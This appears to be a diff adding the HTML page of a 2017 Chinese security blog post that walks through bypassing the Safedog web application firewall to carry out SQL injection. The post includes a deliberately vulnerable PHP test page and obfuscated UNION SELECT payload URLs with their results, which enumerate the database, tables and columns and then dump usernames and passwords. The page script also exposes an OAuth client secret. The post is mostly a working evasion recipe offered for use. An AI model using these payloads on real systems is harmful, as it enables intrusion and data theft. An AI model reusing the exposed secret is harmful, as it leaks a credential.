@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="bypass," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="keywords" content="bypass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bypass_safedog系列2">
+<meta property="og:url" content="http://yoursite.com/bypass_safedog.html">
+<meta property="og:site_name" content="即刻安全">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/img/safedog_bypass_1.jpg">
+<meta property="og:image" content="http://yoursite.com/img/safedog_bypass_1.jpg">
+<meta property="og:image" content="http://yoursite.com/img/safedog_bypass_2.jpg">
+<meta property="og:image" content="http://yoursite.com/img/safedog_bypass_3.jpg">
+<meta property="og:image" content="http://yoursite.com/img/safedog_bypass_4.jpg">
+<meta property="og:image" content="http://yoursite.com/img/safedog_bypass_5.jpg">
+<meta property="og:image" content="http://yoursite.com/img/safedog_bypass_6.jpg">
+<meta property="og:image" content="http://yoursite.com/img/safedog_bypass_7.jpg">
+<meta property="og:image" content="http://yoursite.com/img/safedog_bypass_8.jpg">
+<meta property="og:image" content="http://yoursite.com/img/safedog_bypass_9.jpg">
+<meta property="og:image" content="http://yoursite.com/img/safedog_bypass_10.jpg">
+<meta property="og:image" content="http://yoursite.com/img/safedog_bypass_11.jpg">
+<meta property="og:updated_time" content="2017-09-12T01:05:47.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bypass_safedog系列2">
+<meta name="twitter:image" content="http://yoursite.com/img/safedog_bypass_1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/bypass_safedog.html"/>
+
+
+
+
+
+  <title>Bypass_safedog系列2 | 即刻安全</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">即刻安全</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">即刻安全|致力于网络安全的研究学习平台</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-linux">
+          <a href="/categories/linux" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            linux
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tools">
+          <a href="/categories/tools" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            tools
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-kali">
+          <a href="/categories/kali" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            kali
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-msf">
+          <a href="/categories/Metasploit" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Metasploit
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-windows">
+          <a href="/categories/windows" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            windows
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-渗透">
+          <a href="/categories/渗透" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            渗透
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sql注入">
+          <a href="/categories/sql注入" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            sql注入
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-逆向破解">
+          <a href="/categories/逆向破解" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            逆向破解
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-bypass">
+          <a href="/categories/bypass" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            bypass
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/bypass_safedog.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Secist‘blog | 即刻安全是一个专注于网络安全的研究学习平台">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="即刻安全">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Bypass_safedog系列2</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-03T19:32:11+00:00">
+                2017-09-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/bypass/" itemprop="url" rel="index">
+                    <span itemprop="name">bypass</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="/img/safedog_bypass_1.jpg" alt="image"><br><a id="more"></a></p>
+<blockquote>
+<p>环境:php+mysql+apche<br><br>安全狗:apache版本+8.10规则库<br><br><a href="http://www.inksec.cn/" target="_blank" rel="external">即刻安全</a><br><br>即刻安全纯技术交流群：307283889<br><br>如需转载，请练习本博主声明，私自转载必追究</p>
+</blockquote>
+<h1 id="prat-1"><a href="#prat-1" class="headerlink" title="prat 1"></a>prat 1</h1><h2 id="本文大致内容"><a href="#本文大致内容" class="headerlink" title="本文大致内容"></a>本文大致内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">+ 思路以及想法</div><div class="line">	- 四重注释绕过safedog</div><div class="line">+ 实战绕过</div><div class="line">	- 绕过and 1=1</div><div class="line">	- 绕过union+select</div><div class="line">	- 爆表</div><div class="line">	- 爆字段</div><div class="line">	- 读内容</div></pre></td></tr></table></figure>
+<h1 id="prat-2"><a href="#prat-2" class="headerlink" title="prat 2"></a>prat 2</h1><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$link = mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'security'</span>);</div><div class="line">$sql = <span class="string">"select * from users where id="</span>.$_GET[<span class="string">'id'</span>];</div><div class="line"></div><div class="line">$result = mysqli_query($link,$sql);</div><div class="line"><span class="keyword">if</span>($rows = mysqli_fetch_array($result))&#123;</div><div class="line">	<span class="keyword">echo</span> $rows[<span class="string">'id'</span>];</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">	<span class="keyword">echo</span> $rows[<span class="string">'username'</span>];</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">	<span class="keyword">echo</span> $rows[<span class="string">'password'</span>];</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">&#125;</div><div class="line">mysqli_close($link);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h1 id="prat-3"><a href="#prat-3" class="headerlink" title="prat 3"></a>prat 3</h1><h2 id="绕过-and-1-1"><a href="#绕过-and-1-1" class="headerlink" title="绕过 and 1=1"></a>绕过 and 1=1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=1 and 1=1</div></pre></td></tr></table></figure>
+<p><img src="/img/safedog_bypass_1.jpg" alt="image"><br>发现惨遭拦截，首先让我们来看一下他拦截什么，不拦截什么。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">and        不拦截</div><div class="line">and 1      拦截</div><div class="line">and 1 =    拦截</div><div class="line">and 1 = 1  拦截</div></pre></td></tr></table></figure></p>
+<p>由此可见，只要and后面出现数字或者成立一个等式那么他就拦截，那我们用/**/注释来绕过一下看看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/**/aNd/**//**/&apos;a&apos;/**/ = /**/&apos;a&apos;/**/</div></pre></td></tr></table></figure></p>
+<p>注释包含把1=1替换成<strong>‘a’ = ‘a’</strong>就得到了url:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.107/sql.php?id=1/**/aNd/**//**/&apos;a&apos;/**/=/**/&apos;b&apos;/**/</div></pre></td></tr></table></figure></p>
+<p><img src="/img/safedog_bypass_2.jpg" alt="image"><br>返回不正常(等式不等)并且发现狗就不拦截了，可见注释方法还是如此任性</p>
+<h2 id="Order-by"><a href="#Order-by" class="headerlink" title="Order by"></a>Order by</h2><p>我发现我装的狗是不会拦截order by的，所以也就没绕，有需求在说。<br><img src="/img/safedog_bypass_3.jpg" alt="image"><br>字段为3，接下来爆库，当前用户。</p>
+<h2 id="绕过union-select"><a href="#绕过union-select" class="headerlink" title="绕过union+select"></a>绕过union+select</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=1 UNION SELECT 1,2,3</div></pre></td></tr></table></figure>
+<p><img src="/img/safedog_bypass_4.jpg" alt="image"><br>同样，先看一下他拦截什么。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">union 不拦截</div><div class="line">select 不拦截</div><div class="line">union select 拦截</div></pre></td></tr></table></figure></p>
+<p>很明显，我们只需要在union与select之间处理一下就可以了。<br>首先使用/<em>!50000/注释包含/</em>!<em>/然后使用/**/与/</em>–*/打乱一下结构，在稍微进行一下编码处理就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=-1 /*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,2,3)/*--*/*/-- -</div></pre></td></tr></table></figure></p>
+<p><img src="/img/safedog_bypass_5.jpg" alt="image"><br>可以发现，已经正常显示数字，并且狗没有拦截。   什么？你说没看懂？那么看下图<br><img src="/img/safedog_bypass_6.jpg" alt="image"><br>拆分一下就发现其实很好理解，使用()把select的内容包起来。</p>
+<h2 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.107/sql.php?id=-1 /*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,user(),database())/*--*/*/-- -</div></pre></td></tr></table></figure>
+<p><img src="/img/safedog_bypass_7.jpg" alt="image"><br>发现又特么拦截了，很明显，他会拦截一些常用系统函数(还有许多就不列出来了，列出常用的)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1. version()——MySQL 版本</div><div class="line">2. user()——数据库用户名</div><div class="line">3. database()——数据库名</div><div class="line">4. @@datadir——数据库路径</div><div class="line">5. @@version_compile_os——操作系统版本</div></pre></td></tr></table></figure></p>
+<p>既然已经知道了拦截什么，那么绕他还难么，掏出/**/注释大法。<br>在user(),database()之间处理以下。<br>那么就成为了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">user/**/(/**/)</div><div class="line">database/**/(/**/)</div><div class="line">完整url：http://192.168.1.107/sql.php?id=-1/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,user/**/(/**/),database/**/(/**/))/*--*/*/-- -</div></pre></td></tr></table></figure></p>
+<p><img src="/img/safedog_bypass_8.jpg" alt="image"><br>正常爆出数据库跟当前用户</p>
+<h2 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h2><p>发现我本身的狗可能有点问题，他不拦截from，于是也没有绕，还是那句话，需要啥，绕啥。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=-1</div><div class="line">/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,table_name)),user/**/(/**/)</div><div class="line">from information_schema.tables where table_schema=&apos;security&apos;)/*--*/*/ limit 0,1-- -</div></pre></td></tr></table></figure></p>
+<p><img src="/img/safedog_bypass_9.jpg" alt="image"><br><strong>得到table</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">emails</div><div class="line">referers</div><div class="line">uagents</div><div class="line">users</div></pre></td></tr></table></figure></p>
+<h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=-1</div><div class="line">/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,column_name)),user/**/(/**/)</div><div class="line">from information_schema.columns where table_name=&apos;users&apos;)/*--*/*/ limit 0,1-- -</div></pre></td></tr></table></figure>
+<p><img src="/img/safedog_bypass_10.jpg" alt="image"><br><strong>得到column</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">id</div><div class="line">username</div><div class="line">password</div></pre></td></tr></table></figure></p>
+<h2 id="读内容"><a href="#读内容" class="headerlink" title="读内容"></a>读内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=-1</div><div class="line">/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,username,password)),user/**/(/**/)</div><div class="line">from users)/*--*/*/ limit 0,1-- -</div></pre></td></tr></table></figure>
+<p><img src="/img/safedog_bypass_11.jpg" alt="image"><br><strong>dump</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Dumb#Dumb</div></pre></td></tr></table></figure></p>
+<p><div id="container"></div></p>
+<p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p>
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+  var gitment = new Gitment({
+    owner: 'secistblog',
+    repo: 'secistblog.github.io',
+    oauth: {
+      client_id: '31ca58bed60fa9231b5f',
+      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',
+    },
+  })
+  gitment.render('container')
+</script>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/bypass/" rel="tag"># bypass</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/bypassuac-comhijack.html" rel="next" title="Bypassuac_Comhijack ---kali linux">
+                <i class="fa fa-chevron-left"></i> Bypassuac_Comhijack ---kali linux
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/bypass_shell.html" rel="prev" title="Bypass_safedog系列1">
+                Bypass_safedog系列1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          
+            <img class="site-author-image" itemprop="image"
+              src="/images/avatar.png"
+              alt="Secist‘blog | 即刻安全是一个专注于网络安全的研究学习平台" />
+          
+            <p class="site-author-name" itemprop="name">Secist‘blog | 即刻安全是一个专注于网络安全的研究学习平台</p>
+            <p class="site-description motion-element" itemprop="description">kali|linux|sec|Web|MSF|Win</p>
+        </div>
+
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">分类</span>
+              
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#prat-1"><span class="nav-number">1.</span> <span class="nav-text">prat 1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#本文大致内容"><span class="nav-number">1.1.</span> <span class="nav-text">本文大致内容</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#prat-2"><span class="nav-number">2.</span> <span class="nav-text">prat 2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#测试代码"><span class="nav-number">2.1.</span> <span class="nav-text">测试代码</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#prat-3"><span class="nav-number">3.</span> <span class="nav-text">prat 3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过-and-1-1"><span class="nav-number">3.1.</span> <span class="nav-text">绕过 and 1=1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Order-by"><span class="nav-number">3.2.</span> <span class="nav-text">Order by</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过union-select"><span class="nav-number">3.3.</span> <span class="nav-text">绕过union+select</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆库"><span class="nav-number">3.4.</span> <span class="nav-text">爆库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆表"><span class="nav-number">3.5.</span> <span class="nav-text">爆表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆字段"><span class="nav-number">3.6.</span> <span class="nav-text">爆字段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读内容"><span class="nav-number">3.7.</span> <span class="nav-text">读内容</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Secist‘blog | 即刻安全是一个专注于网络安全的研究学习平台</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+  <span class="post-meta-divider">|</span>
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>
+
+<div>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+</div>
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
